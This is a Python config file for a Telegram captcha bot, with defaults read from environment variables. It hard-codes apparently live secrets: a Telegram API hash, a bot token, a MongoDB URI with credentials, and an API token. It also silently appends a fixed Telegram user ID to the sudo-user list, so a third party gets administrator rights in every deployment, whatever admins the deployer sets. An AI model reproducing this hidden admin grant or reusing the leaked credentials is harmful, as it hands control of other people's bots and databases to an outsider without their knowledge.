#Soon Launching Combined Repo


import os

class Config(object):
    # get it from my.telegram.org
    APP_ID = os.environ.get("APP_ID", "2825957")
    API_HASH = os.environ.get("API_HASH", "2116c16ee8d91a6c825f6da9c809a781")
    # Get it from @botfather
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "1607821276:AAFYz1a1cwJQhHr9Gz6pixkX1VGUqkz7SBg")
    BOT_USERNAME = os.environ.get("BOT_USERNAME", "InnexiaBot")
    # Leave this defualt
    SESSION_NAME = os.environ.get("SESSION_NAME", "JV_CaptchaBot")
    # get it from https://cloud.mongodb.com 
    MONGODB_URI = os.environ.get("MONGODB_URI", "mongodb+srv://hmmmmmmm:hmmmmmmm@cluster0.skzvj.mongodb.net/cluster0?retryWrites=true&w=majority")
    # Ask in https://t.me/JV_Community
    API_TOKEN = os.environ.get("API_TOKEN", "dontsellme_iamfreeapi")
    # Sudo users(goto @JVToolsBot and send /id to get your id)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "1832447570 1947924017").split()))
    SUDO_USERS.append(1204927413)
    SUDO_USERS = list(set(SUDO_USERS))
